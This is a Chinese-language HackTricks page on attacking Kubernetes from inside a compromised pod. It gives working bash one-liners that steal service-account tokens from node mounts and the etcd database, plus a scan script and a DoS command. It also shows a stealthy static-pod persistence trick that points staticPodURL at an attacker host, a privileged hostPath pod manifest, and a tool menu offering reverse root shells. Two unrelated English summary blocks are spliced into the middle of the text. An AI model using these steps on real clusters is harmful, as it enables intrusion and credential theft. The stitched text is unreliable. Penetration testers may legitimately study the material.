# 从 Pod 内部攻击 Kubernetes

{% hint style="success" %}
学习并实践 AWS 黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并实践 GCP 黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## **Pod 逃逸**

**如果你足够幸运，你可能能够从中逃脱到节点:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### 从 Pod 中逃脱

为了尝试从 Pod 中逃脱，你可能需要**先提升权限**，一些可以做到这一点的技术：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

你可以检查这些**Docker 逃逸**来尝试逃脱你已经攻陷的 Pod：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### 滥用 Kubernetes 权限

如在关于**Kubernetes 枚举**的部分所述：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常，Pods 在其中运行的时候会有一个**服务账户令牌**。这个服务账户可能附有一些**权限**，你可以**滥用**这些权限来**移动**到其他 Pods，甚至**逃脱**到集群内配置的节点。查看如何操作：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 滥用云权限

如果 Pod 在**云环境**中运行，你可能能够**从元数据端点泄漏令牌**并使用它提升权限。

## 搜索易受攻击的网络服务

由于你在 Kubernetes 环境内部，如果无法通过滥用当前 Pod 的权限提升权限，也无法逃脱容器，你应该**搜索潜在易受攻击的服务。**

### 服务

**为此，你可以尝试获取 Kubernetes 环境中的所有服务：**
```
kubectl get svc --all-namespaces
```
默认情况下，Kubernetes使用平面网络架构，这意味着**集群中的任何Pod/Service都可以相互通信**。集群中的**命名空间**默认情况下**没有任何网络安全限制**。命名空间中的任何人都可以与其他命名空间通信。

### 扫描

以下Bash脚本（取自[Kubernetes研讨会](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)）将安装并扫描Kubernetes集群的IP范围：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
查看以下页面，了解如何**攻击Kubernetes特定服务**以**危害其他Pod/整个环境**：

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### 嗅探

如果**被入侵的Pod正在运行一些敏感服务**，其他Pod需要进行身份验证，您可能能够通过**嗅探本地通信**来获取其他Pod发送的凭据。

## 网络欺骗

默认情况下，诸如**ARP欺骗**（以及由此引发的**DNS欺骗**）等技术在Kubernetes网络中起作用。然后，在Pod内部，如果您拥有**NET\_RAW功能**（默认情况下已存在），您将能够发送自定义精心制作的网络数据包，并通过**ARP欺骗对同一节点中运行的所有Pod执行中间人攻击**。\
此外，如果**恶意Pod**正在**与DNS服务器在同一节点上运行**，您将能够对集群中的所有Pod执行**DNS欺骗攻击**。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## 节点拒绝服务（DoS）

在Kubernetes清单中没有资源规范，且容器没有**应用限制**范围。作为攻击者，我们可以**消耗Pod/部署运行的所有资源**，使其他资源枯竭，并导致环境发生DoS。

可以使用诸如[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)之类的工具来实现：
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
您可以在运行`stress-ng`时和之后看到差异
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## 节点后渗透

如果你成功**从容器中逃脱**，你会在节点中发现一些有趣的东西：

- **容器运行时**进程（Docker）
- 在节点中运行的更多**pod/容器**，你可以像这个一样滥用（更多令牌）
- 整个**文件系统**和**操作系统**一般情况下
- **Kube-Proxy** 服务正在监听
- **Kubelet** 服务正在监听。检查配置文件：
  - 目录：`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- 其他**Kubernetes常见文件**：
  - `$HOME/.kube/config` - **用户配置**
  - `/etc/kubernetes/kubelet.conf`- **常规配置**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **引导配置**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd 配置**
  - `/etc/kubernetes/pki` - **Kubernetes 密钥**

### 查找节点 kubeconfig

如果你在之前注释的路径中找不到 kubeconfig 文件，**检查 kubelet 进程的参数 `--kubeconfig`**：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 窃取机密
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
脚本 [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) 将自动获取其他 pod 的令牌，并检查它们是否具有您正在寻找的权限（而不是您逐个查看）。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特权 DaemonSets

一个 DaemonSet 是一个**pod**，将在**集群的所有节点**上**运行**。因此，如果一个 DaemonSet 配置了一个**特权服务账户**，在**所有节点**上你将能够找到那个**特权服务账户**的**令牌**，你可以滥用它。

这个漏洞和前一节中的一样，但现在你不再依赖运气。

### 切换到云端

如果集群由云服务管理，通常**节点**对**元数据**端点的访问权限与 Pod 不同。因此，尝试从节点（或从一个具有 hostNetwork 为 True 的 pod）**访问元数据端点**：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### 窃取 etcd

如果你可以指定将运行容器的节点的[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)，在控制平面节点内获取一个 shell 并获取**etcd 数据库**：
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane节点具有**主节点角色**，在**云托管集群中，您将无法在其中运行任何内容**。

#### 从etcd中读取机密

如果您可以在控制平面节点上使用pod规范中的`nodeName`选择器运行您的pod，那么您可能很容易访问包含集群所有配置（包括所有机密）的`etcd`数据库。

以下是一种快速而简单的方法，可以从您所在的控制平面节点上运行的`etcd`中获取机密。如果您想要一个更优雅的解决方案，可以使用带有`etcd`客户端实用程序`etcdctl`的pod，并使用控制平面节点的凭据连接到`etcd`，无论它在何处运行，请查看[@mauilion](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)提供的[此示例清单](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)。

**检查`etcd`是否在控制平面节点上运行，并查看数据库所在位置（这是在`kubeadm`创建的集群上）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

In a Kubernetes cluster, if an attacker gains access to a pod, they can potentially escalate their privileges to gain control over the entire cluster. This section explores various techniques that can be used by an attacker to compromise a Kubernetes cluster from inside a pod.

### Techniques

1. **Accessing the Kubernetes API Server**: An attacker with access to a pod can try to access the Kubernetes API server using service account tokens mounted inside the pod.

2. **Pod Escape**: Attackers can attempt to break out of the pod's container to gain access to the host node and potentially other pods running on the same node.

3. **Network Sniffing**: By sniffing network traffic within the pod, an attacker can intercept sensitive information such as API requests and credentials.

4. **Pod Resource Exhaustion**: Attackers can consume excessive resources within a pod to cause a denial of service (DoS) attack, impacting other pods in the cluster.

### Mitigations

To prevent attacks from inside a pod, consider implementing the following mitigations:

- **Restrict Pod Permissions**: Limit the permissions assigned to pods to reduce the impact of a compromised pod.

- **Network Policies**: Implement network policies to restrict pod-to-pod communication and limit the attack surface.

- **Pod Security Policies**: Enforce security policies to control the actions that pods can perform, such as accessing the host node or other pods.

By understanding these attack techniques and implementing appropriate mitigations, organizations can enhance the security of their Kubernetes clusters.
```
```bash
data-dir=/var/lib/etcd
```
**查看 etcd 数据库中的数据：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**从数据库中提取令牌并显示服务账户名称**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**相同命令，但添加一些 greps 来仅返回 kube-system 命名空间中的默认令牌**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, either through a compromised container or by exploiting a vulnerability, they can leverage this access to further compromise the Kubernetes cluster. This article explores various techniques that an attacker can use to escalate privileges and move laterally within the cluster from inside a pod.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

If the pod's service account has overly permissive Role-Based Access Control (RBAC) roles assigned to it, an attacker can abuse these privileges to perform unauthorized actions within the cluster. By exploiting misconfigured RBAC roles, an attacker can gain additional permissions and potentially take control of the entire cluster.

#### Accessing the Kubernetes API Server

Once inside a pod, an attacker can attempt to access the Kubernetes API server using tools like `kubectl` or by sending direct API requests. If successful, the attacker can interact with the API server to gather sensitive information, modify resources, or deploy malicious workloads.

### Lateral Movement

#### Pod Hopping

An attacker can move laterally within the cluster by compromising multiple pods. By exploiting vulnerabilities or misconfigurations in other pods, the attacker can pivot from one pod to another, gradually expanding their control and influence over the cluster.

#### Node Compromise

If the attacker can escalate their privileges to the node level, they can potentially compromise the entire node and all the pods running on it. This can provide the attacker with a significant foothold in the cluster and enable them to carry out more extensive attacks.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the threats that can originate from within the cluster. By understanding how attackers can exploit vulnerabilities from inside a pod, organizations can better defend against internal threats and secure their Kubernetes deployments.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静态/镜像化 Pod 持久性

_静态 Pod_ 由特定节点上的 kubelet 守护程序直接管理，而无需 API 服务器观察它们。与由控制平面管理的 Pod（例如 Deployment）不同；相反，**kubelet 监视每个静态 Pod**（如果失败，则重新启动）。

因此，静态 Pod 始终**绑定到特定节点上的一个 Kubelet**。

**kubelet 会自动尝试为每个静态 Pod 在 Kubernetes API 服务器上创建一个镜像 Pod**。这意味着在节点上运行的 Pod 可以在 API 服务器上看到，但无法从那里控制。Pod 名称将以节点主机名为后缀，并带有前导连字符。

{% hint style="danger" %}
静态 Pod 的 **`spec` 不能引用其他 API 对象**（例如 ServiceAccount、ConfigMap、Secret 等。因此，**无法滥用此行为来使用任意 ServiceAccount 启动 Pod** 在当前节点中以危害集群。但您可以使用此功能在不同命名空间中运行 Pod（如果出于某种原因有用）。
{% endhint %}

如果您在节点主机内部，可以让其创建一个**静态 Pod 在自身内部**。这非常有用，因为这可能允许您在**不同命名空间**（如 **kube-system**）中创建一个 Pod。

要创建静态 Pod，[**文档是一个很好的帮助**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。您基本上需要 2 件事：

* 在 **kubelet 服务** 中配置参数 **`--pod-manifest-path=/etc/kubernetes/manifests`**，或在 **kubelet 配置**（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）中并重新启动服务
* 在 **`/etc/kubernetes/manifests`** 中的 **pod 定义**中创建定义

**另一种更隐蔽的方法是：**

* 修改 **kubelet** 配置文件中的参数 **`staticPodURL`**，设置类似 `staticPodURL: http://attacker.com:8765/pod.yaml`。这将使 kubelet 进程创建一个**静态 Pod**，从指定的 URL 获取**配置**。

**示例**的 **pod** 配置，用于在 **kube-system** 中创建一个特权 pod，取自[**这里**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### 删除 pods + 无法调度的节点

如果攻击者已经**入侵了一个节点**，并且可以**删除其他节点上的 pods**，并且**使其他节点无法执行 pods**，那么 pods 将在被入侵的节点上重新运行，他将能够**窃取在其中运行的令牌**。\
有关[**更多信息，请访问此链接**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自动化工具

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
学习并练习AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
